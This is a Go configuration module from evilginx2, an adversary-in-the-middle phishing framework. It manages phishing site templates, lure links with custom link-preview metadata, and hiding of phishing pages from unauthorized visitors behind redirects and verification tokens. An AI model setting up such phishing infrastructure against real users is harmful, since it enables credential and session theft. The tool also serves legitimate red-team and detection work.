package core

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

type Lure struct {
	Path          string            `mapstructure:"path" yaml:"path"`
	RedirectUrl   string            `mapstructure:"redirect_url" yaml:"redirect_url"`
	Phishlet      string            `mapstructure:"phishlet" yaml:"phishlet"`
	Info          string            `mapstructure:"info" yaml:"info"`
	OgTitle       string            `mapstructure:"og_title" yaml:"og_title"`
	OgDescription string            `mapstructure:"og_desc" yaml:"og_desc"`
	OgImageUrl    string            `mapstructure:"og_image" yaml:"og_image"`
	OgUrl         string            `mapstructure:"og_url" yaml:"og_url"`
	Params        map[string]string `mapstructure:"params" yaml:"params"`
}

type Config struct {
	siteDomains       map[string]string
	baseDomain        string
	serverIP          string
	sitesEnabled      map[string]bool
	sitesHidden       map[string]bool
	phishlets         map[string]*Phishlet
	phishletNames     []string
	activeHostnames   []string
	redirectParam     string
	verificationParam string
	verificationToken string
	redirectUrl       string
	lures             []*Lure
	cfg               *viper.Viper
}

const (
	CFG_SITE_DOMAINS       = "site_domains"
	CFG_BASE_DOMAIN        = "server"
	CFG_SERVER_IP          = "ip"
	CFG_SITES_ENABLED      = "sites_enabled"
	CFG_SITES_HIDDEN       = "sites_hidden"
	CFG_REDIRECT_PARAM     = "redirect_key"
	CFG_VERIFICATION_PARAM = "verification_key"
	CFG_VERIFICATION_TOKEN = "verification_token"
	CFG_REDIRECT_URL       = "redirect_url"
	CFG_LURES              = "lures"
)

const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		siteDomains:   make(map[string]string),
		sitesEnabled:  make(map[string]bool),
		sitesHidden:   make(map[string]bool),
		phishlets:     make(map[string]*Phishlet),
		phishletNames: []string{},
		lures:         []*Lure{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("yaml")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.yaml")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.baseDomain = c.cfg.GetString(CFG_BASE_DOMAIN)
	c.serverIP = c.cfg.GetString(CFG_SERVER_IP)
	c.siteDomains = c.cfg.GetStringMapString(CFG_SITE_DOMAINS)
	c.redirectParam = c.cfg.GetString(CFG_REDIRECT_PARAM)
	c.verificationParam = c.cfg.GetString(CFG_VERIFICATION_PARAM)
	c.verificationToken = c.cfg.GetString(CFG_VERIFICATION_TOKEN)
	c.redirectUrl = c.cfg.GetString(CFG_REDIRECT_URL)
	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
	for _, site := range s_enabled {
		c.sitesEnabled[site] = true
	}
	s_hidden := c.cfg.GetStringSlice(CFG_SITES_HIDDEN)
	for _, site := range s_hidden {
		c.sitesHidden[site] = true
	}

	var param string
	if c.redirectParam == "" {
		param = strings.ToLower(GenRandomString(2))
		c.SetRedirectParam(param)
	}
	if c.verificationParam == "" {
		for {
			param = strings.ToLower(GenRandomString(2))
			if param != c.redirectParam {
				break
			}
		}
		c.SetVerificationParam(param)
	}
	if c.verificationToken == "" {
		c.SetVerificationToken(GenRandomToken()[:4])
	}
	if c.redirectUrl == "" {
		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
	}
	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)

	return c, nil
}

func (c *Config) SetSiteHostname(site string, domain string) bool {
	if c.baseDomain == "" {
		log.Error("you need to set server domain, first. type: server your-domain.com")
		return false
	}
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return false
	}
	if domain != c.baseDomain && !strings.HasSuffix(domain, "."+c.baseDomain) {
		log.Error("phishlet hostname must end with '%s'", c.baseDomain)
		return false
	}
	c.siteDomains[site] = domain
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	log.Info("phishlet '%s' hostname set to: %s", site, domain)
	c.cfg.WriteConfig()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.baseDomain = domain
	c.cfg.Set(CFG_BASE_DOMAIN, c.baseDomain)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.serverIP = ip_addr
	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
	log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteEnabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if !c.IsSiteEnabled(site) {
		c.sitesEnabled[site] = true
	}
	c.refreshActiveHostnames()
	var sites []string
	for s, _ := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("enabled phishlet '%s'", site)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if c.IsSiteEnabled(site) {
		delete(c.sitesEnabled, site)
	}
	c.refreshActiveHostnames()
	var sites []string
	for s, _ := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("disabled phishlet '%s'", site)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if hide {
		if !c.IsSiteHidden(site) {
			c.sitesHidden[site] = true
		}
	} else {
		if c.IsSiteHidden(site) {
			delete(c.sitesHidden, site)
		}
	}
	c.refreshActiveHostnames()
	var sites []string
	for s, _ := range c.sitesHidden {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_HIDDEN, sites)
	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) ResetAllSites() {
	for s, _ := range c.sitesEnabled {
		c.SetSiteDisabled(s)
	}
	for s, _ := range c.phishlets {
		c.siteDomains[s] = ""
	}
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	c.cfg.WriteConfig()
}

func (c *Config) IsSiteEnabled(site string) bool {
	s, ok := c.sitesEnabled[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) IsSiteHidden(site string) bool {
	s, ok := c.sitesHidden[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for s, _ := range c.sitesEnabled {
		sites = append(sites, s)
	}
	return sites
}

func (c *Config) SetRedirectParam(param string) {
	c.redirectParam = param
	c.cfg.Set(CFG_REDIRECT_PARAM, param)
	log.Info("redirect parameter set to: %s", param)
	c.cfg.WriteConfig()
}

func (c *Config) SetVerificationParam(param string) {
	c.verificationParam = param
	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
	log.Info("verification parameter set to: %s", param)
	c.cfg.WriteConfig()
}

func (c *Config) SetVerificationToken(token string) {
	c.verificationToken = token
	c.cfg.Set(CFG_VERIFICATION_TOKEN, token)
	log.Info("verification token set to: %s", token)
	c.cfg.WriteConfig()
}

func (c *Config) SetRedirectUrl(url string) {
	c.redirectUrl = url
	c.cfg.Set(CFG_REDIRECT_URL, url)
	log.Info("unauthorized request redirection URL set to: %s", url)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts() {
			c.activeHostnames = append(c.activeHostnames, host)
		}
	}
}

func (c *Config) IsActiveHostname(host string) bool {
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			if l.Path == path {
				return l, nil
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	domain, ok := c.siteDomains[site]
	return domain, ok
}

func (c *Config) GetAllDomains() []string {
	var ret []string
	for _, dom := range c.siteDomains {
		ret = append(ret, dom)
	}
	return ret
}

func (c *Config) GetBaseDomain() string {
	return c.baseDomain
}

func (c *Config) GetServerIP() string {
	return c.serverIP
}
